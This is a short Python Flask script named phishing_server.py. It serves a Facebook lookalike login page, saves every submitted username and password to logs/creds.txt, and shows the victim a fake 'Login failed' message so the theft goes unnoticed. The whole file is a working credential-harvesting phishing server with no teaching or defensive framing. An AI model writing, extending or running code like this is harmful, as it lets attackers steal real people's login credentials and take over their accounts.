# phishing_server.py
from flask import Flask, request
import os
import datetime

app = Flask(__name__)
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

@app.route("/")
def index():
    with open("templates/facebook/index.html") as f:
        return f.read()

@app.route("/login", methods=["POST"])
def login():
    creds = request.form.to_dict()
    with open(f"{LOG_DIR}/creds.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] {creds}\n")
    return "Login failed. Try again."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
